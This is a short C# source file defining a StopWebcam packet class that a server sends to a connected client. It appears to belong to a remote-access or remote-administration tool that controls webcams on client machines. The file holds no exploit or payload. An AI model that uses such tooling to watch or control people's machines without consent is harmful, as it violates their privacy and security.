using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class StopWebcam : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.StopWebcam;
            }
        }
        
        public StopWebcam()
        {
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
